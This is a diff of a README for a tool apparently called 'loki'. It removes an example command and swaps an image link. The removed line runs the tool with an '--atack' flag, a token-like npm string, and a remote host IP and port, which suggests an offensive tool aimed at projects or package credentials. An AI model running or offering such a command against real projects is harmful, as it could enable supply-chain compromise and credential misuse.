@@ -29,9 +29,7 @@ Options
 ```
 
 ## Example
-```sh
-$ loki -d ./my-project -a npm_gf56nF46Js4AcaAs31MadKW3L4k --atack --host 17.1.234.33 --port 2030
-```
+
 <div align="center">
-    <p> <img src="https://xh4h.com/uploads/DisfiguredMediumorchid_Condor_Nf8VctBu1wAmJWdW.gif"/> </p>
+    <p> <img src="https://xh4h.com/uploads/loki-carbon.png"/> </p>
 </div>
